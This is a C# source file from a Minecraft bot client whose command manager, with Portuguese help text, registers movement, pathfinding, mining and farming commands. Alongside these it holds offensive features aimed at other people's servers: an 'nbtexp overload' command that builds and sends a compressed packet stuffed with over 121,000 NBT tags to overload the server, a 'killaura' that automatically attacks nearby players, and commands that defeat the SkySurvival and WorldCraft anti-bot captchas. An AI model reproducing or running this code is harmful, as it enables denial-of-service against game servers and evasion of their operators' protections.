using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using AdvancedBot;
using AdvancedBot.Client.Bypassing;
using AdvancedBot.Client.Map;
using AdvancedBot.Client.NBT;
using AdvancedBot.Client.Packets;
using AdvancedBot.Client.PathFinding;
using Newtonsoft.Json.Linq;

namespace AdvancedBot.Client
{
    public class CommandManager
    {
        private static Random rng = new Random();

        public MinecraftClient Client;
        private Entity Player { get { return Client.Player; } }

        private AutoMiner miner = null;

        public const string CMD_PREFIX = "$";
        public const string CMD_OK = "__00";
        public const string CMD_FAIL = "__01";
        public const string CMD_MISSING_ARGS = "__02";
        public const string CMD_NOT_FOUND = "__03";

        private Dictionary<string, CommandInfo> commands = new Dictionary<string, CommandInfo>();

        private delegate string CommandMainFunction(CommandInfo self, string[] args);
        private delegate void CommandTickFunction();
        private class CommandInfo
        {
            public CommandMainFunction MainFunc;
            public CommandTickFunction TickFunc;

            public string[] Args;
            public string Description;

            public bool IsTickable = false;

            public CommandInfo(CommandMainFunction mainFunc, CommandTickFunction tickFunc, params string[] args)
            {
                MainFunc = mainFunc;
                TickFunc = tickFunc;
                IsTickable = true;
                Args = args;
            }
            public CommandInfo(CommandMainFunction mainFunc, params string[] args)
            {
                MainFunc = mainFunc;
                IsTickable = false;
                Args = args;
            }
            public CommandInfo SetDescription(string desc)
            {
                Description = desc;
                return this;
            }
        }
        
        public CommandManager(MinecraftClient b)
        {
            Client = b;

            commands["help"] = new CommandInfo(HandleHelpCommand).SetDescription("Mostra todos os comandos disponíveis.");
            commands["move"] = new CommandInfo(HandleMoveCommand, "direções: [jump,forward,back,left,right]", "duração (20 = 1 sec)").SetDescription("Faz o bot se mover por um tempo determinado.");
            commands["portal"] = new CommandInfo(HandlePortalCommand, "nome do mg").SetDescription("Entra em um portal (CraftLandia).");
            commands["retard"] = new CommandInfo((s, args) => { retard = !retard; return "§aRetard " + (retard ? "§2ativado" : "§4desativado"); }, TickRetard).SetDescription("Faz o bot se mover aleatoriamente.");
            commands["reco"] = new CommandInfo((s, args) => { Client.StartClient(); return CMD_OK; }).SetDescription("Tenta reconectar o bot no servidor.");
            commands["follow"] = new CommandInfo(HandleFollowCommand, TickFollow, "nick").SetDescription("Segue um player (para parar, use o comando sem argumentos).");
            commands["killaura"] = new CommandInfo(HandleKillAuraCommand, TickKillAura, "(opt: nick)").SetDescription("Ataca o player mais próximo ou o especificado pelo argumento.");
            commands["twerk"] = new CommandInfo(HandleTwerkCommand, TickTwerk).SetDescription("...");
            commands["playerlist"] = new CommandInfo((s, args) => { Client.PrintToChat("§aPlayers: §f\r\n" + string.Join(", ", Client.PlayerManager.UUID2Nick.Values)); return CMD_OK; }).SetDescription("Lista os players que estão no servidor (do TAB list).");
            commands["give"] = new CommandInfo(HandleGiveCommand, "id do item", "(opt: metadata)").SetDescription("Coloca o item especificado no primeiro slot da hotbar (se o player estiver no modo criativo).");
            commands["goto"] = new CommandInfo(HandleGotoCommand, "x", "y", "z").SetDescription("Tenta ir até o bloco especificado pelas coordenadas.");
            commands["useentity"] = new CommandInfo(HandleUseEntityCommand, "nick ou @any", "(opt: atacar = 1, clicar = 0)").SetDescription("Ataca o player especificado.");
            commands["hotbarclick"] = new CommandInfo(HandleHotbarClickCommand, "slot").SetDescription("Usa o item da hotbar no slot especificado com o botão direito.");
            commands["invclick"] = new CommandInfo(HandleInvClickCommand, "slot").SetDescription("Clica em um item do inventário aberto no slot especificado.");
            commands["dropall"] = new CommandInfo(HandleDropAllCommand, "Lista de exclusão de slots sem espaços, separada por virgulas ex.: 36,37 (hotbar: 36-44)").SetDescription("Dropa todos os items do inventário do bot.");
            commands["clickblock"] = new CommandInfo(HandleClickBlockCommand, "x", "y", "z", "0 para clicar com o botão esquerdo ou 1 para o direito").SetDescription("Clica em um bloco na coordenada e com o botão especificado.");
            commands["skysurvivalbypass"] = new CommandInfo(HandleSkySurvivalBypass).SetDescription("Burla o sistema antibot do SkySurvival.");

            commands["miner"] = new CommandInfo(HandleMiner).SetDescription("Minera automaticamente. Configurações: Opções->Minerador...");


#if DEBUG
            commands["dbg_showcolors"] = new CommandInfo((s, args) => {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= 0xF; i++) {
                    sb.AppendFormat("§{0:x}{0:x}, ", i);
                }
                return sb.ToString();
            }).SetDescription("");
#endif
            commands["clearchat"] = new CommandInfo((s, args) => {
                lock (Client.ChatMessages) {
                    Client.ChatMessages.Clear();
                    Client.ChatChanged = true;
                }
                return CMD_OK;
            }).SetDescription("Limpa o chat do bot.");

            commands["antiafk"] = new CommandInfo(HandleAntiAFK, TickAntiAFK, "(opt: delay em ms)").SetDescription("Pula de tempo em tempo. O delay padrão é 5000ms.");
            commands["placeblock"] = new CommandInfo(HandlePlaceBlock, "x", "y", "z", "r=posição relativa").SetDescription("Olha para a coordenada especificada e coloca o bloco que está selecionado na hotbar.");

            commands["worldcraftbypass"] = new CommandInfo(HandleWorldCraftBypass).SetDescription("Burla o sistema antibot do WorldCraft.");
            commands["herbalismo"] = new CommandInfo(HandleHerbalismCommand, TickHerbalism).SetDescription("'Macro' de herbalismo.");

            commands["nbtexp"] = new CommandInfo(HandleNBTExp).SetDescription("");
        }

        public List<string> RegisteredCommands
        {
            get { return commands.Keys.ToList(); }
        }

        public string RunCommand(string cmd)
        {
            if (!cmd.StartsWith(CMD_PREFIX) || Client.Player == null) 
                return null;

            int i = cmd.IndexOf(' ');
            string name;
            string[] args;
            if (i == -1) {
                name = cmd.Substring(1);
                args = new string[0];
            } else {
                name = cmd.Substring(1, i-1);
                args = cmd.Substring(i + 1).Split(new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);
            }
            CommandInfo info;
            if (commands.TryGetValue(name, out info)) {
               // if (info.IsRunning) return "§l§cEste comando já está sendo executado";
                try {
                    return info.MainFunc(info, args);
                }
                catch { return CMD_FAIL; }
            }

            return CMD_NOT_FOUND;
        }

        private string HandleHelpCommand(CommandInfo s, string[] args)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("§6Comandos registrados:");
            foreach (KeyValuePair<string, CommandInfo> cmd in commands) {
                CommandInfo c = cmd.Value;

                string pard = c.Args.Length != 0 ? " (parametros: [" + string.Join("] [", c.Args) + "])" : "";
                sb.AppendLine(string.Format("§f - §a${0}§f: {1}{2}", cmd.Key, c.Description, pard));
            }
            Client.PrintToChat(sb.ToString());

            return CMD_OK;
        }
        private string HandleMoveCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 1) return CMD_MISSING_ARGS;

            int dur;
            if (args.Length >= 2 && int.TryParse(args[1], out dur)) {
                if (dur <= 0 || dur > 100) {
                    return "§cA duração prescisa ser entre 1 e 100";
                }
            } else {
                dur = 1;
            }
            Movement mov = Movement.None;
            foreach (string flag in args[0].Split('|', ' ')) {
                switch ((char)(flag[0] | 0x20)) {
                    case 'j': mov |= Movement.Jump; break;
                    case 'f': mov |= Movement.Forward; break;
                    case 'b': mov |= Movement.Back; break;
                    case 'l': mov |= Movement.Left; break;
                    case 'r': mov |= Movement.Right; break;
                }
            }
            for (int i = 0; i < dur; i++) {
                Player.MoveQueue.Enqueue(mov);
            }
            
            return string.Format("§aMovendo nas direções: {0} por {1:0.0} segundo(s)", mov.ToString(), dur / 20.0);
        }
        private string HandlePortalCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 1) return CMD_MISSING_ARGS;

            Vec3i portal = Commands.CommandPortal.FindPortal(Player, args[0].ToLower());
            if (portal == null)
                return "§l§cNão foi possível encontrar o portal";

            ThreadPool.QueueUserWorkItem((cb) =>
            {
                try {
                    PathGuide portalPath;
                    Client.CurrentPath = portalPath = PathGuide.Create(Player, portal.X, portal.Y, portal.Z);
                    if (portalPath == null) {
                        Client.PrintToChat("§4§lNão foi possível calcular o path até o portal");
                        portal = null;
                    }
                } catch { }
            });
            retard = false;
            return CMD_OK;
        }
        private string HandleFollowCommand(CommandInfo s, string[] args)
        {
            if (playerToFollow == null && args.Length == 0)
                return CMD_MISSING_ARGS;

            if (args.Length == 0) {
                playerToFollow = null;
                return CMD_OK;
            }
            lastFollowPos = new Vec3d(0, -555, 0);
            playerToFollow = Client.PlayerManager.GetPlayerByNick(args[0]);
            if (playerToFollow == null)
                return "§cNão foi possível encontrar esse player";
            else {
                retard = false;
                return "§aSeguindo: " + Client.PlayerManager.GetNick(playerToFollow);
            }
        }
        private string HandleKillAuraCommand(CommandInfo s, string[] args)
        {
            killAura = !killAura;
            if (args.Length != 0)
                killAuraQuery = args[0];
            return "§6KillAura " + (killAura ? "§2ativado" : "§4desativado");
        }
        private string HandleTwerkCommand(CommandInfo s, string[] args)
        {
            twerk = !twerk;
            if (!twerk && sneak) {
                sneak = false;
                Client.SendQueue.AddToQueue(new PacketEntityAction(Client.PlayerID, 1, 0));
            }
            return "§aTwerk " + (twerk ? "ativado" : "desativado");
            //return CMD_OK;
        }
        private string HandleGiveCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 1) return CMD_MISSING_ARGS;

            int id = int.Parse(args[0]);
            int data = args.Length > 1 ? int.Parse(args[1]) : 0;

            if (id > 0)
                Client.SendQueue.AddToQueue(new PacketCreativeInvAction(36, new ItemStack((short)id, (short)data)));
            else
                return "§aID inválido!";
            return CMD_OK;
        }
        private string HandleGotoCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 2) return CMD_MISSING_ARGS;

            int x = int.Parse(args[0]);
            int y = int.Parse(args[1]);
            int z = int.Parse(args[2]);
            ThreadPool.QueueUserWorkItem((cb) =>
            {
                try {
                    PathGuide pg = PathGuide.Create(Client.Player, x, y, z);
                    Client.CurrentPath = pg;
                    if (pg == null)
                        Client.PrintToChat(string.Format("§aNão foi possivel calcular o path até o bloco {0} {1} {2}.", x, y, z));
                } catch { }
            });
            return CMD_OK;
        }
        private string HandleUseEntityCommand(CommandInfo s, string[] args)
        {
            Entity me = Client.Player;
            bool attack = (args.Length > 1 && args[1][0] == '1') ? false : true;

            if (args.Length < 1 || args[0] == "@any") {
                double bestDist = double.MaxValue;
                MPPlayer bestPlayer = null;
                foreach (MPPlayer p in Client.PlayerManager.Players.Values) {
                    double pDist = Utils.DistTo(me.PosX, me.AABB.MinY, me.PosZ, p.X, p.Y, p.Z);
                    if (pDist <= 4 && pDist < bestDist && !IsBot(Client.PlayerManager.GetNick(p))) {
                        bestDist = pDist;
                        bestPlayer = p;
                    }
                }
                if (bestPlayer != null) {
                    me.LookTo(bestPlayer.X, bestPlayer.Y + 1.62, bestPlayer.Z);
                    Client.SendQueue.AddToQueue(new PacketSwingArm(Client.PlayerID)); //send swing
                    Client.SendQueue.AddToQueue(new PacketUseEntity(bestPlayer.EntityID, attack));
                }
                return CMD_OK;
            }

            MPPlayer player = Client.PlayerManager.GetPlayerByNick(args[0]);
            if (player == null) return "§l§cPlayer não encontrado";
            if (!me.CanSeePlayer(player) || Utils.DistToSq(me.PosX, me.AABB.MinY, me.PosZ, player.X, player.Y, player.Z) > 6 * 6)
                return "§l§cO player está muito longe ou existe algum bloco entre o bot e ele.";

            me.LookTo(player.X, player.Y + 1.62, player.Z);

            Client.SendQueue.AddToQueue(new PacketSwingArm(Client.PlayerID)); //send swing
            Client.SendQueue.AddToQueue(new PacketUseEntity(player.EntityID, attack));

            return CMD_OK;
        }
        private string HandleHotbarClickCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 1) return CMD_MISSING_ARGS;

            int slot = int.Parse(args[0]);
            if (slot >= 1 && slot <= 9) {
                Client.HotbarSlot = slot - 1;

                Client.LeftClickItem();

                return CMD_OK;
            }
            else return "§l§cA posição do slot precisa ser entre 1 e 9.";
        }
        private string HandleInvClickCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 1) return CMD_MISSING_ARGS;

            Inventory inv = Client.OpenWindow;
            if (inv == null) return "§l§cNenhum inventário aberto...";

            int islot = int.Parse(args[0]);
            if (islot >= 1 && islot <= inv.NumSlots)
                inv.Click(Client, (short)(islot - 1), false);
            else
                return "§l§cA posição do slot precisa ser entre 1 e " + inv.NumSlots + ".";

            return CMD_OK;
        }
        private string HandleDropAllCommand(CommandInfo s, string[] args)
        {
            int[] excList = new int[0];
            if (args.Length > 0) {
                try {
                    excList = args[0].Split(',').Select(n => int.Parse(n)).ToArray();
                } catch {
                    Client.PrintToChat("§eIgnorando lista de exclusão: Erro de sintaxe.");
                }
            }

            ThreadPool.QueueUserWorkItem((cb) => {
                try {
                    Inventory pinv = Client.Inventory;
                    for (int slot = 5; slot < 45; slot++) {
                        if (pinv.Slots[slot] != null && !excList.Contains(slot)) {
                            pinv.DropItem(Client.SendQueue, slot);
                            Thread.Sleep(150);
                        }
                    }
                } catch { }
            });
            return CMD_OK;
        }
        private string HandleClickBlockCommand(CommandInfo s, string[] args)
        {
            if (args.Length < 3) return CMD_MISSING_ARGS;

            int x = int.Parse(args[0]);
            int y = int.Parse(args[1]);
            int z = int.Parse(args[2]);
            bool leftClick = args[3].ToLower() == "0";

            Entity p = Client.Player;
            if (Utils.DistTo(p.PosX, p.PosY, p.PosZ, x, y, z) > 5.5)
                return "§l§cO bot está muito longe do bloco. Use $goto [x] [y] [z] para ir até lá.";

            p.LookToBlock(x, y, z, true);

            HitResult hit = Client.TheWorld.RayCast(new Vec3d(p.PosX, p.PosY, p.PosZ), new Vec3d(x + 0.5, y + 0.5, z + 0.5), false, true);
            int face = hit == null ? 1 : hit.Face;
            if (leftClick) {
                Client.SendQueue.AddToQueue(new PacketPlayerDigging(DiggingStatus.StartedDigging, x, (byte)y, z, (byte)face));
                Client.SendQueue.AddToQueue(new PacketPlayerDigging(DiggingStatus.CancelledDigging, x, (byte)y, z, (byte)face));
            } else {
                if (hit == null)
                    hit = new HitResult(x, y, z, face);
                Client.SendQueue.AddToQueue(new PacketBlockPlace(hit, Client.ItemInHand));
            }
            return CMD_OK;
        }

        private string HandleSkySurvivalBypass(CommandInfo s, string[] args)
        {
            Inventory inv = Client.OpenWindow;
            if (inv == null || !inv.Title.StartsWith("Clique n")) return "§l§4Inventário inválido.";
            ThreadPool.QueueUserWorkItem((cb) => {
                try {
                    foreach (int slot in SkySurvival.GetSlotsToClick(Client)) {
                        Inventory.ClickedItem = null;
                        inv.Click(Client, (short)slot, false);
                        Debug.WriteLine("Captcha slot: " + slot);
                        Thread.Sleep(1050);
                    }
                } catch { }
            });
            return CMD_OK;
        }
        private string HandleWorldCraftBypass(CommandInfo s, string[] args)
        {
            int islot = WorldCraftBP.GetSlotsToClick(Client)[0];
            if (islot == -1) return CMD_OK;

            Inventory.ClickedItem = null;
            Client.OpenWindow.Click(Client, (short)islot, false);

            return CMD_OK;
        }

        private string HandleMiner(CommandInfo s, string[] args)
        {
            if (miner == null)
                miner = new AutoMiner(Client);
            if (!miner.IsMining) {
                miner.StartMining(args);
                return "§aMinerador ativado.";
            } else {
                miner.StopMining();
                return "§cMinerador desativado.";
            }
        }

        bool herbalism = false;
        private string HandleHerbalismCommand(CommandInfo s, string[] args)
        {
            herbalism = !herbalism;
            if (args.Length != 0)
                killAuraQuery = args[0];
            return "§6Herbalismo " + (herbalism ? "§2ativado" : "§4desativado");
        }
        private void TickHerbalism()
        {
            if (herbalism) {
                int px = Utils.Floor(Player.PosX);
                int py = Utils.Floor(Player.AABB.MinY);
                int pz = Utils.Floor(Player.PosZ);

                Player.LookToBlock(px, py, pz, false);

                HitResult hit = Player.RayCastBlocks(6);
                if (hit == null) {
                    Client.PrintToChat("§6HERBALISMO: §cNão foi possível encontrar o bloco.");
                    herbalism = false;
                    return;
                }
                
                int blockId = Client.TheWorld.GetBlock(hit.X, hit.Y, hit.Z);
                if (hit.Y == py - 1) {
                    if (Client.ItemInHand == null || Client.ItemInHand.ID != Items.reeds) {
                        for (int i = 0; i < 9; i++) {
                            ItemStack stack = Client.GetHotbarItem(i);
                            if (stack != null && stack.ID == Items.reeds) {
                                Client.HotbarSlot = i;
                                break;
                            }
                        }
                    }

                    if (Client.ItemInHand != null && Client.ItemInHand.ID == Items.reeds) {
                        Client.PlaceCurrentBlock(hit);
                    }
                } else if (blockId == Blocks.reeds) {
                    Client.BreakBlock(hit);
                    if (hit.Y != py && Client.TheWorld.GetBlock(hit.X, hit.Y - 1, hit.Z) == Blocks.reeds) {
                        Client.TheWorld.SetBlockAndData(hit.X, hit.Y, hit.Z, 0, 0);
                        hit = Player.RayCastBlocks(6);
                        Client.BreakBlock(hit);
                    }
                }
            }
        }

        private string HandleAntiAFK(CommandInfo s, string[] args)
        {
            if (antiAfkDelay > 0) {
                antiAfkDelay = -1;
                return "§aAntiAFK desligado";
            } else if (args.Length > 0 && int.TryParse(args[0], out antiAfkDelay)) {
                if (antiAfkDelay <= 0)
                    return "§cO delay prescisa ser maior que 0ms";
            } else {
                antiAfkDelay = 5000;
            }
            return "§aAntiAFK ligado";
        }
        private string HandlePlaceBlock(CommandInfo s, string[] args)
        {
            if (args.Length >= 3) {
                int x = int.Parse(args[0]);
                int y = int.Parse(args[1]);
                int z = int.Parse(args[2]);
                if (args.Length >= 4 && args[3] == "r") {
                    x += Utils.Floor(Player.PosX);
                    y += Utils.Floor(Player.AABB.MinY);
                    z += Utils.Floor(Player.PosZ);
                }
                Player.LookToBlock(x, y, z, true);
            }
            if (Client.ItemInHand == null || Client.ItemInHand.ID >= 256) {
                return "§cO bot não tem nenhum bloco selecionado na hotbar!";
            }
            HitResult hit = Player.RayCastBlocks(6);
            if (hit == null) {
                return "§cO bot não está olhando para nenhum bloco!";
            }
            Client.PlaceCurrentBlock(hit);

            return string.Format("§aBloco colocado em {0} {1} {2}.", hit.X, hit.Y, hit.Z);
        }

        // commands["nbtexp"] = new CommandInfo(HandleNBTExp).SetDescription("");
        static byte[] cachedNbtExp1, cachedNbtExp2;
        private string HandleNBTExp(CommandInfo s, string[] args)
        {
            if (args.Length < 0) {
                return "§cParametros: [overload ou exploit]";
            }
            switch (args[0]) {
                case "overload":
                    if (cachedNbtExp2 == null) {
                        ItemStack stack = new ItemStack(1, 0, 1);

                        CompoundTag tag = new CompoundTag("root");
                        for (int i = 0; i < 121250; i++) {
                            CompoundTag t = new CompoundTag();
                            t.AddIntArray("R", new int[0]);
                            tag.Add(i.ToString(), t);
                        }
                        stack.NBTData = tag;

                        WriteBuffer buf = new WriteBuffer();
                        new PacketBlockPlace(stack).WritePacket(buf, Client);
                        //new PacketClickWindow(0, 0, 0, 0, 0, stack).WritePacket(buf, Client); ver>=1.9

                        int len = buf.Length;
                        byte[] comp = Utils.ZlibCompress(buf.GetBytes(), Ionic.Zlib.CompressionLevel.Level9);
                        buf.Reset();
                        buf.WriteVarInt(comp.Length + MinecraftStream.GetVarIntLength(len));
                        buf.WriteVarInt(len);
                        buf.WriteByteArray(comp);
                        cachedNbtExp2 = buf.GetBytes();
                        Debug.WriteLine((buf.Length / 1024.0) + "KiB");
                    }
                    Client.SendQueue.AddToQueue(new UnsafeDirectPacket(cachedNbtExp2));
                    break;
                case "exploit":
                    if (Client.Version <= ClientVersion.v1_8) {

                    } else {
                        Client.PrintToChat("§cEsse exploit só funciona em versões < 1.8.3.");
                    }
                    break;
            }
            
            return CMD_OK;
        }

        private bool IsBot(string nick)
        {
            List<MinecraftClient> clients = Program.FrmMain.Clients;
            for (int i = 0; i < clients.Count; i++) {
                MinecraftClient cli = clients[i];
                if (cli.IsBeingTicked() && cli.Username != null && cli.Username.Equals(nick)) return true;
            }
            return false;
        }

        public void Update()
        {
            foreach (CommandInfo info in commands.Values) {
                if (info.IsTickable)
                    info.TickFunc();
            }
            if (miner != null) {
                miner.Tick();
            }
        }

        bool retard = false;
        MPPlayer playerToFollow = null;
        Vec3d lastFollowPos = new Vec3d(0, -555, 0);

        int antiAfkDelay = -1;
        int antiAfkCounter = 0;

        private void TickRetard()
        {
            if (retard)
            {
                double time = DateTime.Now.Ticks / 1000000.0;
                Player.Yaw = (float)(Math.Cos(time) * (180.0 / Math.PI));
                Player.Pitch = (float)(Math.Sin(time) * (90.0 / Math.PI));

                if (rng.Next(11) < 5)
                {
                    int t = rng.Next(4);
                    for (int i = 0; i < t; i++)
                    {
                        switch (rng.Next(5))
                        {
                            case 0: Player.MoveQueue.Enqueue(Movement.Jump); break;
                            case 1: Player.MoveQueue.Enqueue(Movement.Forward); break;
                            case 2: Player.MoveQueue.Enqueue(Movement.Back); break;
                            case 3: Player.MoveQueue.Enqueue(Movement.Left); break;
                            case 4: Player.MoveQueue.Enqueue(Movement.Right); break;
                        }
                    }
                }
            }
        }
        private void TickFollow()
        {
            Entity p = Player;
            if (playerToFollow != null)
            {
                double dist = Utils.DistTo(p.PosX, p.AABB.MinY, p.PosZ, playerToFollow.X, playerToFollow.Y, playerToFollow.Z);
                bool exists = Client.PlayerManager.PlayerExists(playerToFollow.EntityID);
                if (!exists || dist > 80)
                {
                    Client.PrintToChat("§cO player está muito distante");
                    Client.CurrentPath = null;
                    playerToFollow = null;
                    return;
                }

                p.LookTo(playerToFollow.X, playerToFollow.Y + 1.62, playerToFollow.Z);
                double lastDist = Utils.DistTo(playerToFollow.X, playerToFollow.Y, playerToFollow.Z,
                                               lastFollowPos.X, lastFollowPos.Y, lastFollowPos.Z);
                if (lastDist >= 2.5)
                {
                    ThreadPool.QueueUserWorkItem((cb) =>
                    {
                        try {
                            Client.CurrentPath = PathGuide.Create(Client.Player, Utils.Floor(playerToFollow.X), Utils.Floor(playerToFollow.Y), Utils.Floor(playerToFollow.Z));
                        }
                        catch { }
                    });
                    lastFollowPos = new Vec3d(playerToFollow.X, playerToFollow.Y, playerToFollow.Z);
                }
            }
        }
        private void TickAntiAFK()
        {
            if (antiAfkDelay > 0 && (antiAfkCounter += 50) >= antiAfkDelay) {
                Player.MoveQueue.Enqueue(Movement.Jump);
                antiAfkCounter = 0;
            }
        }

        string killAuraQuery = null;
        public bool killAura = false;
        int lastAttack = 0;
        private void TickKillAura()
        {
            if (killAura) {
                Entity me = Client.Player;

                MPPlayer bestPlayer = null;
                if (lastAttack++ >= 5) {
                    lock (Client.PlayerManager.Players) {
                        double bestDist = double.MaxValue;
                        foreach (MPPlayer p in Client.PlayerManager.Players.Values) {
                            double pDist = Utils.DistTo(me.PosX, me.AABB.MinY, me.PosZ, p.X, p.Y, p.Z);
                            if (pDist <= 4) {
                                if ((killAuraQuery == null ? true : Client.PlayerManager.GetNick(p).EqualsIgnoreCase(killAuraQuery)) &&
                                    (bestPlayer == null || pDist < bestDist) && me.CanSeePlayer(p)) {
                                    bestDist = pDist;
                                    bestPlayer = p;
                                }
                            }
                        }
                    }
                    if (bestPlayer != null) {
                        me.LookTo(bestPlayer.X, bestPlayer.Y + 1.62, bestPlayer.Z);

                        Client.SendQueue.AddToQueue(new PacketSwingArm(Client.PlayerID)); //send swing
                        Client.SendQueue.AddToQueue(new PacketUseEntity(bestPlayer.EntityID, true));
                    }
                    lastAttack = 0;
                }
            }
        }

        bool twerk = false;
        bool sneak = false;
        int twerkTicks;
        private void TickTwerk()
        {
            if (twerk && twerkTicks++ >= 2) {
                sneak = !sneak;
                Client.SendQueue.AddToQueue(new PacketEntityAction(Client.PlayerID, (byte)(sneak ? 0 : 1), 0));
                twerkTicks = 0;
            }
        }
    }
}
